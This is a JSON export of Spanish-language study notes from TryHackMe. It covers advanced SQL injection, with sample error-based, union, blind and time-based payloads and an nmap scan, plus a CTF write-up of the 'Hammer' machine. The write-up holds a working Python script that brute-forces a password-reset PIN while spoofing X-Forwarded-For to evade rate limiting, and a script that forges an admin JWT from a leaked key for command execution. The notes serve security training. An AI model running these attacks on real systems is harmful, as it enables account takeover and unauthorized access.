[
  {
    "title": "3. Second-Order SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/3-second-order-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/3. Second-Order SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La second-order SQLi, también conocida como SQLi stored, explota vulnerabilidades donde el input dado por el usuario es guardado y después usado en una parte diferente de la aplicación, posiblemente tras un procesado inicial. Este tipo de ataque pasa más desapercibido porque el código malicioso SQL no aparece en errores u otros sitios obvios. La inyección ocurre en el segundo uso de los datos, cuando es recuperada y usada en un comando SQL, de ahí el nombre.\n\n![[Pasted image 20251229221729.png]]\n\n---------------------------------------\n<h2>Impacto</h2>\nEl peligro de este tipo de inyección recae en su habilidad de bypassear defensas típicas del front end como validación o sanitización básica, la cual sólo ocurre en el punto inicial de introducción de información. Como no causa errores durante el primer paso, puede ser sebreseído hasta que ya es demasiado tarde, haciéndolo particularmente sigiloso.\n\n---------------------------------\n<h2>Preparando el Payload</h2>",
    "modified": "2025-12-30T00:53:49"
  },
  {
    "title": "2. Quick Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/2-quick-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/2. Quick Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En la última unidad de SQLi, exploramos los fundamentos de SQLi, entendiendo cómom los atacantes explotan vulnerabilidades en las aplicaciones web para manipular queries SQL y acceder a información no autorizada. Cubrimos técnicas esenciales como la SQLi basada en error o en unión, métodos de blind SQLi como la basada en booleanos o en tiempo. Aquí un repaso rápido de lo que ya sabemos:\n\n![[Pasted image 20251229135548.png]]\n\n----------------------------------------\n<h2>In-band SQL Injection</h2>\nEsta técnica está considerada una de las más comunes y directas de inyección SQL. En esta técnica el atacante usa el mismo canal de comunicación para tanto la inyección y recuperación de información. Hay dos tipos principales de inyección SQL in-band.\n\n- **Error-Based SQL Injection:** El atacante manipula la query SQL para producir mensajes de error de la base de datos. Estos mensajes de error suelen contener información sobre la estructura de la base de datos, lo que puede usarse para explotar la base de datos. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. Si la versión de la base de datos es devuelta en el mensaje de error, revela información sobre esta.\n- **Union-Based SQL Injection:** El atacante usa el operador SQL UNION para combinar los resultados de dos o más statements SELECT en un solo resultado, recuperando así información de otras tablas. Ejemplo: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.\n\n--------------------------------------------\n<h2>Inferential (Blind) SQL Injection</h2>\nLa inyección SQL inferencial no transfiere la información directamente a través de la aplicación web, haciendo explotarla más difícil. En su lugar, el atacante manda payloads y observa el comportamiento de la aplicación y tiempos de respuesta para inferir información sobre la base de datos. Hay dos tipos principales de inyección SQL inferencial:\n\n- **Boolean-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos, forzando la aplicación a que devuelva un resultado diferente basado en una condición true o false. Analizando la respuesta de la aplicación, el atacante puede inferir si el payload era cierto o no. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`.\n- **Time-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos que retrasa la respuesta por un periodo de tiempo específico si la condición es cierta. Midiendo el tiempo de respuesta, el atacante puede inferir si la condición es cierta o no. Ejemplo: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`.\n\n--------------------------\n<h2>Out-of-band SQL Injection</h2>\nOut-of-band SQL Injection es usada cuando el atacante no puede usar el mismo canal para lanzar el ataque y reunir resultados o cuando las respuestas del servidor son inestables. Esta técnica se basa en que el servidor de base de datos haga una petición out-of-band para mandar los resultados de la query al atacante. HTTP es normalmente usado en la inyección SQL out-of-band para mandar el resultado de la query al servidor del atacante.\n\nCada tipo de técnica de inyección SQL tiene sus ventajas y retos.Entender estas técnicas es crucial para identificar y mitigar vulnerabilidades de injección SQL en las aplicaciones web. La inyección SQL in-band, es fácil de explotar y detectar pero ruidosa y fácilmente monitorizable. La inyección SQL inferencial es más difícil de explotar y requiere múltiples peticiones pero puede ser usada cuando los mensajes detallados de error no están disponibles. La inyección SQL out-of-band es menos común y altamente efectiva, requiere un servidor de control externo y se basa en la habilidad de la base de datos de hacer peticiones out-of-band. Controlando estas técnicas, los pentesters pueden identificar eficientemente vulnerabilidades de inyección SQL, ayudando a las organizaciones a securizar sus aplicaciones web contra amenazas.",
    "modified": "2025-12-30T00:53:49"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "Sigue siendo una de las vulnerabilidades más severas y expandidas. Ocurre cuando un atacante consigue explotar una aplicación web y ganar la habilidad de ejecutar queries SQL arbitrarias llevando a acceso no autorizado a la base de datos, exfiltración de información, manipulación de datos o incluso control total sobre la aplicación. En esta unidad veremos técnicas avanzadas de inyección SQL, entendiendo vectores de ataque sofisticados, así como estrategias de mitigación.\n\n------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad, ganaremos un entendimiento profundo de los siguientes conceptos clave:\n\n- Second-order SQL Injection.\n- Evasión de Filtros.\n- Out-of-band SQL Injection.\n- Técnicas de Automatización.\n- Medidas de Mitigación.\n\n------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]\n- [[0. SQLMap - The Basics]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n- [[0. Nmap - The Basics]]\n\n-------------------------------\n<h2>Conectarse a la Máquina</h2>\nConéctate como normalmente lo haces. Antes de seguir, es clave entender qué versión de base de datos tiene así como detalles del sistema operativo. Para ello, podemos usar Nmap.\n\n```bash\nthm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST\nNmap scan report for MACHINE_IP\nHost is up (0.00034s latency).\n\nPORT     STATE    SERVICE       VERSION\n135/tcp  open     msrpc\n139/tcp  open     netbios-ssn\n445/tcp  open     microsoft-ds\n3306/tcp open     mysql\n3389/tcp open     ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=SQLi\n| Not valid before: 2024-05-23T04:08:44\n|_Not valid after:  2024-11-22T04:08:44\n|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.\nMAC Address: 02:87:BD:21:12:33 (Unknown)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized\nRunning (JUST GUESSING): AVtech embedded (87%)\nAggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.67 seconds\n```\n\nEsta máquina usa MySQL en Windows.",
    "modified": "2025-12-29T00:58:28"
  },
  {
    "title": "2. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/2-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/2. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "1. Empezaremos con el reconocimiento (aunque ya sabemos por donde va a tirar, seguramente algo de MFA).\n\t1. Escaneo de puertos.\n\t   ![[Pasted image 20251226045221.png]]\n\t   Miramos a ver qué es el servicio waste.\n\t   ![[Pasted image 20251226045350.png]]\n\t2. Escaneo de puertos en profundidad.\n\t   ![[Pasted image 20251226045429.png]]\n\t   Como el puerto 80 no está abierto, no tiene sentido escanear directorios ni subdominios.\n2. Si vamos al puerto `1337` encontramos no que parece un endpoint de login.\n   ![[Pasted image 20251226045730.png]]\n3. Si miramos el código fuente podemos ver la convención de nombramiento de directorios.\n   ![[Pasted image 20251226045828.png]]\n   Si intentamos hacer fuzzeo de directorios a este tipo de dirección:\n   ![[Pasted image 20251226050658.png]]\n4. Si le damos al único archivo aparentemente interesante, `reset_password.php`, podemos ver el código de flujo del reseteo de contraseñas.\n   ![[Pasted image 20251226050007.png]]\n   Parece que hay una cuenta atrás en la que tienes que introducir el código.\n5. Si revisamos los directorios que encontramos fuzzeando antes, sólo hay dos que parecen poder tener algo interesante.\n\t1. El primero y más interesante es `/hmr_logs/`, el cual contiene logs de error de conexión en los que se detallan usuarios, endpoints, hostnames, etc.\n\t   ![[Pasted image 20251226051220.png]]\n\t2. El segundo, y algo menos llamativo es `/hmr_images`, en donde hay una imagen de un taller con martillo.\n\t   ![[Pasted image 20251226051304.png]]\n\t   No hay nada en la imagen, por lo que definitivamente seguiremos por el otro lado.\n\t   ![[Pasted image 20251226051450.png]]\n6. Vamos a investigar bien los logs que hemos encontrado.\n   ![[Pasted image 20251226052104.png]]\n\t1. Lo más llamativo a simple vista es que parece que tenemos un usuario: `tester@hammer.thm`.\n\t2. Además podemos ver la página a la que aparentemente querríamos poder acceder: `/restricted-area`.\n\t3. Vemos un posible hostname del sistema que nos puede servir más adelante para forzar la entrada por ssh: `hammerthm`.\n\t4. Vemos que hay un login de administrador: `/admin-login`.\n\t5. Parece que hay un límite de 10 peticiones, pero no sabemos en qué se basa para filtrar, todavía.\n7. Con todo esto en mente vamos a investigar las respuestas del servidor con BurpSuite.\n\t1. Para usuario y contraseñas erróneos:\n\t\t1. Manda usuario y contraseña por POST.\n\t\t   ![[Pasted image 20251226052659.png]]\n\t\t2. En la respuesta recibimos \"Invalid Email or Password\".\n\t\t   ![[Pasted image 20251226052821.png]]\n\t2. Para usuario correcto y contraseña errónea:\n\t\t1. La petición inicial sigue siendo igual pero con diferentes credenciales.\n\t\t   ![[Pasted image 20251226052934.png]]\n\t\t2. La respuesta también es igual.\n\t\t   ![[Pasted image 20251226053050.png]]\n8. Vamos a ver qué pasa si le damos a \"Forgot your password?\".\n\t1. Esta petición ya parece más interesante.\n\t   ![[Pasted image 20251226053711.png]]\n\t   Está llamando al endpoint `/reset_password.php`.\n\t2. Si dejamos pasar las peticiones y metemos el email, obtenemos una página con un contador.\n\t   ![[Pasted image 20251226053918.png]]\n\t3. Si introducimos un código que no es no nos saca directamente.\n\t   ![[Pasted image 20251226054009.png]]\n\t4. Si lo introducimos mal unas cuantas veces pone:\n\t   ![[Pasted image 20251226060052.png]]\n9. Ejecutaremos el siguiente código.\n   \n```python\nimport requests\nimport sys\nimport random\nfrom concurrent.futures import ThreadPoolExecutor\n\n# Configuración\nIP = \"IP\" #Cambia esto\nbase_url = f'http://{IP}:1337'\nurl = f'{base_url}/reset_password.php'\nemail = 'tester@hammer.thm'\nMAX_THREADS = 10\n\nexito = False\n\ndef get_new_session():\n    s = requests.Session()\n    try:\n        s.post(url, data={'email': email}, timeout=10)\n        if 'PHPSESSID' in s.cookies:\n            return s\n    except:\n        return None\n    return None\n\ndef batch_worker(start_pin):\n    global exito\n    if exito: return\n\n    session = get_new_session()\n    if not session: return\n\n    for i in range(7):\n        current_pin = start_pin + i\n        if current_pin > 9999 or exito: break\n        \n        pin_str = f\"{current_pin:04d}\"\n        headers = {\n            'X-Forwarded-For': f\"127.0.0.{random.randint(1,254)}\",\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        data = {'recovery_code': pin_str, 's': '180'}\n\n        try:\n            # Importante: allow_redirects=True para seguir a la página de nueva password\n            resp = session.post(url, data=data, headers=headers, allow_redirects=True, timeout=10)\n\n            if \"Invalid or expired\" not in resp.text and \"Rate limit\" not in resp.text:\n                exito = True\n                print(f\"\\n\\n[!] ¡ÉXITO! PIN CONFIRMADO: {pin_str}\")\n                print(f\"[+] PHPSESSID: {session.cookies.get('PHPSESSID')}\")\n                print(f\"[+] URL FINAL: {resp.url}\")\n                \n                # Guardamos la página para que la veas\n                with open(\"exito.html\", \"w\") as f:\n                    f.write(resp.text)\n                print(f\"[+] Contenido guardado en 'exito.html'. Ábrelo con tu navegador.\")\n                return\n\n            sys.stdout.write(f\"\\r[*] Intentando: {pin_str} \")\n            sys.stdout.flush()\n        except:\n            pass\n\ndef main():\n    pines_iniciales = [i for i in range(0, 10000, 7)]\n    # Como ya sabemos que es el 1013, el script llegará rápido.\n    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:\n        executor.map(batch_worker, pines_iniciales)\n\nif __name__ == \"__main__\":\n    main()\n   ```\n   \n   Obtenemos lo siguiente:\n   ![[Pasted image 20251226063426.png]]\n\n10. Si metemos dicha cookie y OTP:\n    ![[Pasted image 20251226063621.png]]\n11. Si cambiamos la contraseña e iniciamos sesión:\n    ![[Pasted image 20251226063708.png]]\n    Hemos encontrado la flag del dashboard, nos queda la del sistema.\n12. Si probamos con ls vemos que hay un archivo `.php` de ejecución de comandos.\n    ![[Pasted image 20251227214535.png]]\n13. Parece ser que hay un elemento que nos echa de la sesión. Si miramos el código fuente:\n    ![[Pasted image 20251227215423.png]]\n    Podemos ver que si el valor `persistentCookie` no está en true nos echará todo el rato.\n14. Vamos a interceptar una petición de ejecución de comandos con Burp Suite.\n    ![[Pasted image 20251227220212.png]]\n    Vemos que hay un archivo `.key`.\n15. Vamos a analizar el JWT con `jwt.io`.\n    ![[Pasted image 20251227220459.png]]\n16. Como tenemos acceso podemos listar el secreto `188ade1.key`.\n    ![[Pasted image 20251227220723.png]]\n17. Vamos a usar un script de python para generar el JWT.\n    \n```python\nimport jwt\n\n# The secret key from /var/www/mykey.key\nsecret_key = \"56058354efb3daa97ebab00fabd7a7d7\"\n\n# JWT header including 'kid'\nheader = {\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\",\n    \"kid\": \"/var/www/html/188ade1.key\"\n}\n\n# Payload with the 'admin' role\npayload = {\n    \"iss\": \"http://hammer.thm\",\n    \"aud\": \"http://hammer.thm\",\n    \"iat\": TiempoDeCreación,\n    \"exp\": TiempoDeExpiración (poner más alto),\n    \"data\": {\n        \"user_id\": 1,\n        \"email\": \"tester@hammer.thm\",\n        \"role\": \"admin\"\n    }\n}\n\n# Encode the JWT with the specific header\ntoken = jwt.encode(payload, secret_key, algorithm=\"HS256\", headers=header)\n\n# Print the generated token\nprint(token)\n```\n\n18. Lo ejecutamos y obtenemos el JWT.\n    ![[Pasted image 20251227221145.png]]\n19. Metemos dicho token en el header authorization bearer y en el valor y ejecutamos un comando para leer `/home/ubuntu/flag.txt`.\n    \n    ![[Pasted image 20251227222238.png]]\n\n>[!CAUTION] Lee los scripts usados antes de utilizarlos para entender cómo funcionan y qué cosas debes cambiar.\n\n>[!SUCCESS] Hemos conseguido obtener ambar flags. También podríamos haber obtenido una reverse shell del sistema en nuestra máquina pero no era necesario para el propósito de la máquina.",
    "modified": "2025-12-28T01:00:21"
  },
  {
    "title": "0. Hammer",
    "path": "/apuntes/thm/maquinas/2-medium/6-hammer/0-hammer/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 6. Hammer",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/1. Introduction]]\n[[2. Getting the Flags]]",
    "modified": "2025-12-27T00:52:04"
  }
]